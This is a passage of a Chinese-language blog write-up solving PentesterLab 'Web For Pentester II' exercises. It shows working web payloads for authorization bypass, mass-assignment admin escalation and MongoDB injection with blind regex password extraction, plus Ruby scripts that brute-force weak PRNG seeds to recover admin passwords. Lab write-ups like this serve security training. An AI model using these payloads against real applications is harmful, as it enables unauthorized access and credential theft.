<p>&#x624B;&#x5934;&#x6B63;&#x597D;&#x6709; Pkav &#x56E2;&#x961F;&#x7684; HTTP Fuzzer&#xFF0C;&#x6D4B;&#x4E86;&#x4E00;&#x4E0B;&#x6548;&#x679C;&#x8FD8;&#x4E0D;&#x9519;</p>
<p><img src="/2020/03/11/Pentesterlab-Web-For-Pentester-II/2-3-1.png" alt="image"></p>
<h3 id="Captcha-Example-7"><a href="#Captcha-Example-7" class="headerlink" title="Captcha Example 7"></a>Captcha Example 7</h3><p>&#x589E;&#x52A0;&#x4E86;&#x6805;&#x680F;&#x964D;&#x4F4E;&#x8BC6;&#x522B;&#x6210;&#x529F;&#x7387;</p>
<p><img src="/2020/03/11/Pentesterlab-Web-For-Pentester-II/2-3-2.png" alt="image"></p>
<h3 id="Captcha-Example-8"><a href="#Captcha-Example-8" class="headerlink" title="Captcha Example 8"></a>Captcha Example 8</h3><p>&#x56FE;&#x50CF;&#x5F00;&#x59CB;&#x626D;&#x66F2;&#x4E86;&#x3002;&#x3002;&#x5B98;&#x65B9;&#x63A8;&#x8350;&#x4F7F;&#x7528; <strong><a href="https://github.com/tesseract-ocr/tesseract" target="_blank" rel="noopener">tesseract</a></strong></p>
<h3 id="Captcha-Example-9"><a href="#Captcha-Example-9" class="headerlink" title="Captcha Example 9"></a>Captcha Example 9</h3><p>&#x7B97;&#x6570;&#x9A8C;&#x8BC1;&#xFF0C;Python &#x6B63;&#x5219;&#x5339;&#x914D;&#x540E;&#x4E22; eval &#x6267;&#x884C;&#x5373;&#x53EF;</p>
<p>&#x9A8C;&#x8BC1;&#x7801;&#x662F;&#x771F;&#x6EF4;&#x70E6;&#x3002;&#x3002;</p>
<h2 id="Authorization"><a href="#Authorization" class="headerlink" title="Authorization"></a>Authorization</h2><h3 id="Auth2-Example-1"><a href="#Auth2-Example-1" class="headerlink" title="Auth2 Example 1"></a>Auth2 Example 1</h3><p>&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#xFF1A;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/authorization/example1/infos/1</span><br></pre></td></tr></table></figure>

<h3 id="Auth2-Example-2"><a href="#Auth2-Example-2" class="headerlink" title="Auth2 Example 2"></a>Auth2 Example 2</h3><p>&#x6C34;&#x5E73;&#x8D8A;&#x6743;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/authorization/example2/infos/3</span><br></pre></td></tr></table></figure>

<h3 id="Auth2-Example-3"><a href="#Auth2-Example-3" class="headerlink" title="Auth2 Example 3"></a>Auth2 Example 3</h3><p>&#x4FE1;&#x606F;&#x7F16;&#x8F91;&#x5904;&#x6C34;&#x5E73;&#x8D8A;&#x6743;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/authorization/example3/infos/edit/3</span><br></pre></td></tr></table></figure>

<h2 id="Mass-Assignment"><a href="#Mass-Assignment" class="headerlink" title="Mass Assignment"></a>Mass Assignment</h2><h3 id="Mass-Example-1"><a href="#Mass-Example-1" class="headerlink" title="Mass Example 1"></a>Mass Example 1</h3><p>&#x81EA;&#x52A8;&#x7ED1;&#x5B9A;&#x6F0F;&#x6D1E;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/massassign/example1/signup?user[username]=admin&amp;user[password]=admin&amp;user[admin]=1&amp;submit=%E6%8F%90%E4%BA%A4</span><br></pre></td></tr></table></figure>

<h3 id="Mass-Example-2"><a href="#Mass-Example-2" class="headerlink" title="Mass Example 2"></a>Mass Example 2</h3><p><code>Modify your profile</code> &#x5904;&#x5B58;&#x5728;&#x81EA;&#x52A8;&#x7ED1;&#x5B9A;&#x6F0F;&#x6D1E;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/massassign/example2/update_profile?user[username]=admin&amp;user[password]=admin&amp;user[admin]=1&amp;submit=%E6%8F%90%E4%BA%A4</span><br></pre></td></tr></table></figure>

<h3 id="Mass-Example-3"><a href="#Mass-Example-3" class="headerlink" title="Mass Example 3"></a>Mass Example 3</h3><p>&#x8FD8;&#x662F; <code>Modify your profile</code> &#x5904;&#xFF0C;&#x53C2;&#x6570;&#x66B4;&#x9732;&#x7684;&#x5F88;&#x660E;&#x663E;</p>
<p>FUZZ &#x63A7;&#x5236;&#x7528;&#x6237; <code>Company</code> &#x7684;&#x53C2;&#x6570;&#x5373;&#x53EF;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/massassign/example3/update_profile?user[username]=user1&amp;user[password]=123&amp;user[company_id]=2&amp;submit=%E6%8F%90%E4%BA%A4</span><br></pre></td></tr></table></figure>

<h2 id="Randomness-Issues"><a href="#Randomness-Issues" class="headerlink" title="Randomness Issues"></a>Randomness Issues</h2><h3 id="Rand-Example-1"><a href="#Rand-Example-1" class="headerlink" title="Rand Example 1"></a>Rand Example 1</h3><p>&#x4F7F;&#x7528;&#x4E86;&#x5F31;&#x4F2A;&#x968F;&#x673A;&#x6570;&#xFF0C;&#x79CD;&#x5B50;&#x7ED9;&#x5B9A;&#x6BCF;&#x6B21;&#x5F97;&#x5230;&#x7684;&#x7ED3;&#x679C;&#x4E00;&#x81F4;&#xFF0C;&#x672C;&#x5730;&#x91CD;&#x8DD1;&#x4E00;&#x4E0B;&#x5F97;&#x5230; admin &#x5BC6;&#x7801; <code>mpvadd</code></p>
<h3 id="Rand-Example-2"><a href="#Rand-Example-2" class="headerlink" title="Rand Example 2"></a>Rand Example 2</h3><p>&#x9700;&#x8981;&#x7206;&#x7834;&#xFF0C;&#x770B;&#x6837;&#x5B50;&#x4E0D;&#x96BE;</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/ruby</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line">time = Time.now.to_i</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">  s = Random.new(time)</span><br><span class="line">  pass = <span class="number">6</span>.times.map { (<span class="string">&apos;a&apos;</span>..<span class="string">&apos;z&apos;</span>).to_a[s.rand((<span class="string">&apos;a&apos;</span>..<span class="string">&apos;z&apos;</span>).to_a.size)]}.join</span><br><span class="line">  pass2 = <span class="number">6</span>.times.map { (<span class="string">&apos;a&apos;</span>..<span class="string">&apos;z&apos;</span>).to_a[s.rand((<span class="string">&apos;a&apos;</span>..<span class="string">&apos;z&apos;</span>).to_a.size)]}.join</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> pass2 == <span class="string">&quot;molfqg&quot;</span></span><br><span class="line">    puts <span class="string">&quot;[+] Admin Password is: <span class="subst">#{pass}</span>&quot;</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  time -= <span class="number">1</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>&#x7206;&#x51FA;&#x5BC6;&#x7801;&#xFF1A;<code>fvyaep</code></p>
<h3 id="Rand-Example-3"><a href="#Rand-Example-3" class="headerlink" title="Rand Example 3"></a>Rand Example 3</h3><p>&#x548C;&#x4F8B; 1 &#x4E00;&#x6837;&#x7684;&#xFF0C;&#x672C;&#x5730;&#x91CD;&#x8DD1;&#x4E00;&#x4E0B;&#xFF0C;&#x5F97;&#x5230;&#x5BC6;&#x7801;&#xFF1A;<code>pvaddhjtvs</code></p>
<h3 id="Rand-Example-4"><a href="#Rand-Example-4" class="headerlink" title="Rand Example 4"></a>Rand Example 4</h3><p>&#x52A0;&#x4E86;&#x4E2A; <code>rand(1000).times {s.rand(5)}</code></p>
<p>&#x8FD8;&#x662F;&#x548C;&#x4F8B; 2 &#x4E00;&#x6837;&#x7206;</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/ruby</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">  s = Random.new(<span class="number">0</span>)</span><br><span class="line">  rand(<span class="number">1000</span>).times {s.rand(<span class="number">5</span>)}</span><br><span class="line">  pass = <span class="number">6</span>.times.map { (<span class="string">&apos;a&apos;</span>..<span class="string">&apos;z&apos;</span>).to_a[s.rand((<span class="string">&apos;a&apos;</span>..<span class="string">&apos;z&apos;</span>).to_a.size)]}.join</span><br><span class="line">  pass2 = <span class="number">6</span>.times.map { (<span class="string">&apos;a&apos;</span>..<span class="string">&apos;z&apos;</span>).to_a[s.rand((<span class="string">&apos;a&apos;</span>..<span class="string">&apos;z&apos;</span>).to_a.size)]}.join</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> pass2 == <span class="string">&quot;rfznij&quot;</span></span><br><span class="line">    puts <span class="string">&quot;[+] Admin Password is: <span class="subst">#{pass}</span>&quot;</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>&#x7206;&#x51FA;&#x5BC6;&#x7801;&#xFF1A;<code>bghxoy</code></p>
<h2 id="MongoDB-Injection"><a href="#MongoDB-Injection" class="headerlink" title="MongoDB Injection"></a>MongoDB Injection</h2><p>&#x5BF9; Ruby &#x548C; Mongo &#x8BED;&#x6CD5;&#x90FD;&#x4E0D;&#x592A;&#x719F;&#xFF0C;&#x76F4;&#x63A5;&#x770B;&#x6E90;&#x7801;&#x590D;&#x73B0;</p>
<p>&#x5B98;&#x65B9;&#x5EFA;&#x8BAE;&#xFF1A;</p>
<ul>
<li>&#x5728;&#x6CE8;&#x5165;&#x70B9;&#x4E4B;&#x540E;&#x627E;&#x5230;&#x53EF;&#x4EE5;&#x9003;&#x9038;&#x4EE3;&#x7801;&#x7684;&#x5185;&#x5BB9;</li>
<li>&#x67E5;&#x627E;&#x5982;&#x4F55;&#x751F;&#x6210;&#x59CB;&#x7EC8;&#x4E3A;&#x771F;&#x7684;&#x6761;&#x4EF6;&#xFF08;&#x4F8B; 1&#xFF09;</li>
<li>&#x67E5;&#x627E;&#x5982;&#x4F55;&#x68C0;&#x7D22;&#x6D88;&#x606F;&#xFF08;&#x4F8B; 2&#xFF09;</li>
</ul>
<h3 id="Mongo-Example-1"><a href="#Mongo-Example-1" class="headerlink" title="Mongo Example 1"></a>Mongo Example 1</h3><p>&#x5355;&#x5F15;&#x53F7;&#x62A5;&#x9519;&#xFF0C;&#x8FD9;&#x91CC;&#x4F7F;&#x7528;&#x5355;&#x5F15;&#x53F7;&#x9003;&#x9038;</p>
<p>&#x4F7F;&#x7528; <code>|| 1==1</code> &#x66FF;&#x4EE3; <strong>RDBMS</strong> &#x4E2D;&#x7684; <code>or 1=1</code></p>
<p>&#x4F7F;&#x7528; <code>//</code>&#x3001;<code>&lt;!--</code> &#x6CE8;&#x91CA;&#x67E5;&#x8BE2;&#x672B;&#x5C3E;&#x8BED;&#x53E5;</p>
<p>&#x6700;&#x7EC8; Payload&#xFF1A;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/mongodb/example1/?username=1%27||1==1//&amp;password=1</span><br></pre></td></tr></table></figure>

<h3 id="Mongo-Example-2"><a href="#Mongo-Example-2" class="headerlink" title="Mongo Example 2"></a>Mongo Example 2</h3><p>&#x9700;&#x8981;&#x4E00;&#x4E9B;&#x731C;&#x6D4B;&#x5DE5;&#x4F5C;&#xFF0C;&#x597D;&#x5229;&#x7528;&#x901A;&#x914D;&#x7B26;&#x4F9D;&#x6B21;&#x731C;&#x89E3;&#x5B57;&#x6BB5;&#x5185;&#x5BB9;</p>
<p>&#x5229;&#x7528;&#x4E0B;&#x8FF0;&#x8BED;&#x53E5; Fuzz &#x53C2;&#x6570;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; &amp;&amp; this.username.match(/./)//+%00</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/11/Pentesterlab-Web-For-Pentester-II/2-7-1.png" alt="image"></p>
<p>&#x8BF7;&#x6C42;&#xFF1A;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search=admin&apos;+%26%26+this.password.match(/.*/)//+%00</span><br><span class="line">search=admin&apos;+%26%26+this.passwordzz.match(/xx/)//+%00</span><br></pre></td></tr></table></figure>

<p>&#x5224;&#x65AD;&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x4F5C;&#x4E3A;&#x76F2;&#x6CE8;&#x4F9D;&#x636E;&#xFF0C;&#x8FD9;&#x91CC;&#x7B26;&#x5408;&#x4E8C;&#x503C;&#x6761;&#x4EF6;&#xFF0C;&#x5F00;&#x59CB;&#x7206;&#x7834;</p>
<p>Intruder &#x6A21;&#x5757;&#x8BBE;&#x7F6E;&#x7206;&#x7834;&#x4F4D;&#x7F6E;</p>
<p><img src="/2020/03/11/Pentesterlab-Web-For-Pentester-II/2-7-2.png" alt="image"></p>
<p>&#x5F97;&#x5230;&#x9996;&#x4F4D;&#x5B57;&#x6BCD; <code>i</code>&#xFF0C;&#x4F9D;&#x6B21;&#x7206;&#x7834;&#x5F97;&#x5230;&#x5B8C;&#x6574;&#x5BC6;&#x7801;&#xFF1A;<code>icanhazpassw0rd</code></p>
<p><img src="/2020/03/11/Pentesterlab-Web-For-Pentester-II/2-7-3.png" alt="image"></p>
<h1 id="&#x603B;&#x7ED3;"><a href="#&#x603B;&#x7ED3;" class="headerlink" title="&#x603B;&#x7ED3;"></a>&#x603B;&#x7ED3;</h1><p>&#x6BD4;&#x7B2C;&#x4E00;&#x5F39;&#x591A;&#x4E86;&#x4E9B;&#x903B;&#x8F91;&#x6F0F;&#x6D1E;</p>
<p>&#x521D;&#x6B65;&#x8BA4;&#x8BC6;&#x4E86; MongoDB &#x6CE8;&#x5165;&#x3001;Ruby &#x4F2A;&#x968F;&#x673A;&#x51FD;&#x6570; <code>Random()</code> &#x548C;&#x4E00;&#x4E9B;&#x70E6;&#x4EBA;&#x6EF4;&#x9A8C;&#x8BC1;&#x7801;</p>
<p>&#x8865;&#x5145;&#x4E86;&#x4E00;&#x4E9B; limit &#x6CE8;&#x5165;&#x77E5;&#x8BC6;&#x548C;&#x6D4B;&#x8BD5;&#x601D;&#x8DEF;</p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>c0r1</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="http://www.c0r1.com/2020/03/11/Pentesterlab-Web-For-Pentester-II/">http://www.c0r1.com/2020/03/11/Pentesterlab-Web-For-Pentester-II/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/é¶æº/"># é¶æº</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>Â· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
            
            <a class="next" rel="next" href="/2020/03/10/Pentesterlab-Web-For-Pentester/">Pentesterlab: Web For Pentester</a>
            
        </section>


    </article>
</div>

        </div>
        <footer id="footer" class="footer">
    <div class="copyright">
        <span>Â© c0r1 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>
</html>
